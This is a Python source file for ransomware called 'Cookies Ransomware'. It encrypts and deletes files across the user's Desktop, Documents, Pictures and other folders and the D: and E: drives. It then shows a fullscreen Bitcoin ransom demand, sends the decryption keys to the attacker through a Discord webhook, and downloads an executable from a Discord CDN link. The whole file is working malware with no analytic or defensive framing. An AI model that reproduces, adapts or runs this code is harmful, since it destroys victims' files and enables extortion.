import json
import os 
import random
import string
import base64
import webbrowser
import urllib.request
import urllib
import httpx
import time
import tkinter as tk
from threading import *
from time import sleep

from urllib.request import urlopen

from tokens import *

from cryptography.fernet import Fernet as f
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from discord_components import *
from tkinter import *
from random import randint
from ctypes import *
digits = randint(1111,9999)
global appdata
appdata = os.getenv('APPDATA')


def password(passwd):
    
    password = passwd.encode() 
    salt = b'salt_' 
    kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100000,
    backend=default_backend()
            )
    k = base64.urlsafe_b64encode(kdf.derive(password))
    return k

def enc_fun(key,file):
    try:
        with open(file,"rb") as fname:
            data = fname.read()
        fl,ext = os.path.splitext(file)
        fkey = f(key)
        enc = fkey.encrypt(data)
        with open(str(fl[0:])+ext+'.PAYUPBITCH','wb') as encfile:
            encfile.write(enc)
        os.remove(file)
    except:
        pass

def spam_messagebox():

    root= tk.Tk()
    width = root.winfo_screenwidth() 
    height = root.winfo_screenheight() 


    canvas1 = tk.Canvas(root, width = width, height = height, bg='black') 
    canvas1.pack()

    label1 = tk.Label(root, text='YOUR FILES HAVE BEEN ENCRYPTED') 
    label1.config(font=('helvetica', int(height/20)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/15), window=label1)


    label1 = tk.Label(root, text=f'YOUR DIGITS ARE {digits}') 
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*4, window=label1)


    label1 = tk.Label(root, text='YOUR IMPORTANT PROGRAMS, DOCUMENTS, DATAS, PHOTOS, SCRIPTS, SOURCE CODE AND VIDEOS') 
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*6, window=label1)


    label1 = tk.Label(root, text='HAVE BEEN ENCRYPTED WITH HIGH GRADE MILITARY ENCRYPTION.') 
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*7, window=label1)


    label1 = tk.Label(root, text='YOU ONLY HAVE 48 HOURS TO SUBMIT THE PAYMENT, AFTER THAT THE PRICE WILL BE DOUBLED') 
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*8, window=label1)


    label1 = tk.Label(root, text='If you do not pay within 5 days, your files will be deleted forever') 
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*9, window=label1)


    label1 = tk.Label(root, text=f'to decrypt them, send {ransom_price} in BITCOIN to')
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*11, window=label1)

    
    labelBTC = tk.Label(root, text=f"{btc_address}") 
    labelBTC.config(font=('helvetica', int(height/50))) 
    labelBTC.config(background='black', foreground='red') 
    canvas1.create_window(int(width/2), int(height/20)*13, window=labelBTC)
                                                # *13 means how far down the canvas the subtitle is!

    label1 = tk.Label(root, text=f'and then send proof of transfer & your digits to {hackers_email} to get your files decrypted')
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*15, window=label1)

    def How_To_BTC():
        webbrowser.open('https://blog.hubspot.com/marketing/how-to-get-bitcoins#:~:text=There%20are%20four%20main%20ways,in%20exchange%20for%20completing%20tasks.')


    button1 = tk.Button(text='How to buy BITCOIN?', command=How_To_BTC)
    button1.config(background='blue')
    canvas1.create_window(int(width/2), int(height/20)*17, window=button1)



    root.attributes('-topmost', True) # Puts message box infont of everything else
    root.attributes('-fullscreen', True) # Set message box to fullscreen
    root.mainloop()

def download_decrypter():

    NAME = os.getlogin()
    req = urllib.request.Request('https://cdn.discordapp.com/attachments/947224575622676520/968921038786285668/Decrypt_My_Files.exe', headers={'User-Agent': 'Mozilla/5.0'})
    f = urlopen(req)
    filecontent = f.read()
    with open(f'C:\\Users\\{NAME}\\Desktop\\Decrypt_My_Files.exe', 'wb') as f:
        f.write(filecontent)
    f.close()

PASSWORDS = []

# Encrypt C: Items, Desktop, Downloads, Documents, Pictures etc...
def C_drive_desktop():
    userdir = f'C:\\Users\\{os.getlogin()}\\Desktop'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                import threading
                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                x.start()
                                x.join()
            else:
                enc_fun(password(passwd),file_input)

            finshed = True
            lol = 'Desktop Folder : '
            PASSWORDS.append(f"{lol}{passwd}")
        else:
            shit = 420
    else:
        shit = 420

def C_drive_downloads():
    userdir = f'C:\\Users\\{os.getlogin()}\\Downloads'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                import threading
                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                x.start()
                                x.join()
            else:
                enc_fun(password(passwd),file_input)

            finshed = True
            lol = 'Downloads Folder : '
            PASSWORDS.append(f"{lol}{passwd}")
        else:
            shit = 420
    else:
        shit = 420

def C_drive_documents():
    userdir = f'C:\\Users\\{os.getlogin()}\\Documents'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                import threading
                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                x.start()
                                x.join()
            else:
                enc_fun(password(passwd),file_input)

            finshed = True
            lol = 'Documents Folder : '
            PASSWORDS.append(f"{lol}{passwd}")
        else:
            shit = 420
    else:
        shit = 420

def C_drive_music():
    userdir = f'C:\\Users\\{os.getlogin()}\\Music'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                import threading
                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                x.start()
                                x.join()
            else:
                enc_fun(password(passwd),file_input)

            finshed = True
            lol = 'Music Folder : '
            PASSWORDS.append(f"{lol}{passwd}")
        else:
            shit = 420
    else:
        shit = 420

def C_drive_pictures():
    userdir = f'C:\\Users\\{os.getlogin()}\\Pictures'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                import threading
                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                x.start()
                                x.join()
            else:
                enc_fun(password(passwd),file_input)

            finshed = True
            lol = 'Pictures Folder : '
            PASSWORDS.append(f"{lol}{passwd}")
        else:
            shit = 420
    else:
        shit = 420

def C_drive_videos():
    userdir = f'C:\\Users\\{os.getlogin()}\\Videos'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                import threading
                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                x.start()
                                x.join()
            else:
                enc_fun(password(passwd),file_input)

            finshed = True
            lol = 'Videos Folder : '
            PASSWORDS.append(f"{lol}{passwd}")
        else:
            shit = 420
    else:
        shit = 420

# Other Drives
def D_drive():
    userdir = f'D:\\'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                import threading
                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                x.start()
                                x.join()
            else:
                enc_fun(password(passwd),file_input)

            finshed = True
            lol = 'D Drive : '
            PASSWORDS.append(f"{lol}{passwd}")
        else:
            shit = 420
    else:
        shit = 420

def E_drive():
    userdir = f'E:\\'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                import threading
                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                x.start()
                                x.join()
            else:
                enc_fun(password(passwd),file_input)

            finshed = True
            lol = 'E Drive : '
            PASSWORDS.append(f"{lol}{passwd}")
        else:
            shit = 420
    else:
        shit = 420

a = Thread(target = C_drive_desktop)
b = Thread(target = C_drive_downloads)
c = Thread(target = C_drive_documents)
d = Thread(target = C_drive_music)
e = Thread(target = C_drive_pictures)
ff = Thread(target = C_drive_videos)
g = Thread(target = D_drive)
h = Thread(target = E_drive)

download = Thread(target = download_decrypter)
message = Thread(target = spam_messagebox)

start = time.time()
c.start()
d.start()
e.start()
ff.start()
g.start()
h.start()
a.start()
b.start()


end = time.time()
encrpyt_time = (end - start)
embed = {
    'username' : 'Cookies Ransomware',
    'avatar_url': 'https://cdn.discordapp.com/attachments/947224575622676520/953286335198806086/Pfp.gif',
    'embeds': [
        {
            'author': {
                'name': f'*{os.getlogin()}* Cookies Ransomware Info',
                'url': 'http://cookiesservices.xyz',
                'icon_url': 'https://cdn.discordapp.com/attachments/947224575622676520/953286335198806086/Pfp.gif'
            },
            'color': 16119101,
            'description': f'Finished encrypted everything - Time to encrypt everything {(encrpyt_time)}',
            'fields': [
                {
                    'name': '\u200b',
                    'value': f'''```
Keys to decrypt: 
                        
{json.dumps(PASSWORDS, indent=6)}
                        ```
                    ''',
                    'inline': True
                }
            ],
            'footer': {
                'text': 'Cookies Ransomware | cookiesservices.xyz'
            }
        }
    ]
}
httpx.post(webhook, json=embed)
download.start()
message.start()

download.join()
message.join()
